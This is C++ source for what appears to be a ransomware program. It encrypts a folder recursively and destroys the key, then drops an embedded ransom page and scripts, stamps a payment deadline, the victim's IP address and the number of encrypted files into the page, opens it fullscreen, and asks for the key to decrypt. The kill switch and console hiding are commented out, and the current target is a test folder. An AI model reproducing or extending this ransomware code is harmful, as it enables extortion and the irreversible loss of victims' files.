#include <time.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <Lmcons.h>
#include <windows.h>

#include "headers/factory.h"
#include "headers/base64.h"
#include "headers/embedded_file.h"

enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };

WinVer WindowsVersion() {
  system("ver > version");
  FILE* ver = fopen("version", "rb");
  if (ver == nullptr) return Error;
  fseek(ver, 0, SEEK_END);
  long size = ftell(ver);
  rewind(ver);
  char* buffer = new char[size];
  fread(buffer, 1, size, ver);
  char digits[] = "1234567890";
  int pos = strcspn(buffer, digits);
  int major = int(atof(&buffer[pos]) * 10) / 10;
  int minor = int(atof(&buffer[pos]) * 10) % 10;
  fclose(ver);
  delete[] buffer;
  remove("version");

  switch (major) {
    case 10:
      return Win10;
    case 6:
      switch (minor) {
        case 3: return Win8_1;
        case 2: return Win8;
        case 1: return Win7;
        case 0: return WinVista;
      }
    break;
    case 5:
      switch (minor) {
        case 2: return WinXP64;
        case 1: return WinXP32;
        case 0: return Win2000;
      }
    break;
  }
  return Other;
}

bool KillSwitch() {
  return WindowsVersion() != Win10;
}

int main(int argc, char* argv[]) {
  //FreeConsole();

  // Warning!!! This is all the security you will get.
  // Remove the line below under your own risk
  //if (KillSwitch()) exit(EXIT_FAILURE);

  Factory* factory = new Factory();
  IController* encrypter = factory->getIController();
  
  DWORD length = UNLEN + 1;
  char username[length];
  GetUserName(username, &length);
  char* path = new char[length + 12];
  sprintf(path, "C:\\Users\\%s", username);
  printf("User Folder in %s\n\n", path);
  char* temp = new char[length + 31];
  sprintf(temp, "%s\\AppData\\Local\\Temp", path);
  printf("Temp Folder in %s\n\n", temp);

  FILE* file = fopen("index.htm", "r");
  if (file == NULL) {
    fclose(file);
    size_t size;
    const char* data;

    data = find_embedded_file("flag.png", &size);
    file = fopen("flag.png", "wb");
    fwrite(data, sizeof(uint8_t), size, file);
    fclose(file);

    data = find_embedded_file("index.htm", &size);
    file = fopen("index.htm", "wb");
    fwrite(data, sizeof(uint8_t), size, file);
    fclose(file);

    data = find_embedded_file("jester.png", &size);
    file = fopen("jester.png", "wb");
    fwrite(data, sizeof(uint8_t), size, file);
    fclose(file);

    data = find_embedded_file("styles.css", &size);
    file = fopen("styles.css", "wb");
    fwrite(data, sizeof(uint8_t), size, file);
    fclose(file);

    data = find_embedded_file("getip.bat", &size);
    file = fopen("getip.bat", "wb");
    fwrite(data, sizeof(uint8_t), size, file);
    fclose(file);

    data = find_embedded_file("fullscreen.vbs", &size);
    file = fopen("fullscreen.vbs", "wb");
    fwrite(data, sizeof(uint8_t), size, file);
    fclose(file);
  }

  if (argc == 1) {
    encrypter->generateKey();
    encrypter->recursive(ENCRYPT, "testfolder");
    encrypter->destroyKey();

    /// GET TIME OF TOMORROW
    time_t timenow = time(NULL) + 24 * 60 * 60;
    tm* timeinfo = localtime(&timenow);
    unsigned int year = timeinfo->tm_year + 1900;
    unsigned int month = timeinfo->tm_mon + 1;

    /// ADD DATE TO FILE
    FILE* cryptowall = fopen("index.htm", "r+");
    fseek(cryptowall, 304, SEEK_SET);
    fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
            timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);

    /// GET IP
    unsigned int ip[4];
    system("getip.bat");
    FILE* loadip = fopen("ip", "r+");
    fscanf(loadip, "%u.%u.%u.%u", &ip[0], &ip[1], &ip[2], &ip[3]);
    fclose(loadip);

    /// ADD IP TO FILE
    fseek(cryptowall, 1775, SEEK_SET);
    // ip may have different lengths: 0.0.0.0 / 255.255.255.255, pad with spaces
    char ipbuffer[16] = "               ";
    int ip_pad = sprintf(ipbuffer, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
    ipbuffer[ip_pad] = ' '; // Remove '\0' set by sprintf
    fwrite(ipbuffer, sizeof(char), 15, cryptowall);
    remove("ip");

    /// ADD Total Files Encrypted
    fseek(cryptowall, 1965, SEEK_SET);
    char cfbuffer[32];
    strcpy(cfbuffer, "      ");
    int cf_pad;
    unsigned int cant_files = encrypter->getCantEncrypted();
    if (cant_files > 1000)
      cf_pad = sprintf(cfbuffer, "%u,%03u", cant_files / 1000, cant_files % 1000);
    else
      cf_pad = sprintf(cfbuffer, "%u", cant_files % 1000);
    cfbuffer[cf_pad] = ' '; // Remove '\0' set by sprintf
    fwrite(cfbuffer, sizeof(char), 6, cryptowall);
    fclose(cryptowall);

    encrypter->test();
  }

  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window index.htm");
  system("fullscreen.vbs");

  //AllocConsole();
  uint8_t key[32];
  char digit1, digit2;
  printf("\n\t***** FILE DECRYPTER *****\n");
  printf("Enter the key (64 hexadecimal digits):\n");
  for (uint8_t i = 0; i < 32; i++) {
    do {
      digit1 = getchar();
    } while (digit1 == ' ' || digit1 == '\n');
    do {
      digit2 = getchar();
    } while (digit2 == ' ' || digit2 == '\n');
    key[i] = chartohex(digit1) * 16 + chartohex(digit2);
  }
  printf("\nKey:\n");
  PrintHex(key, 32);
  printf("\n");

  char c;
  do {
    c = getchar();
  } while (c != '\n' && c != EOF);

  printf("Are you sure you wanna decrypt?\nA wrong key will make your files unrecoverable forever");
  printf(" (Y/n): ");
  char opt;
  scanf("%c", &opt);
  if (opt == 'Y' || opt == 'y') {
    printf("Decrypting... DO NOT CLOSE THE PROGRAM!\n");
    encrypter->setKey(key);
    encrypter->recursive(DECRYPT, "testfolder");
  }
  printf("%u files has been decrypted\n", encrypter->getCantDecrypted());
  getchar();
  delete factory;
  return 0;
}
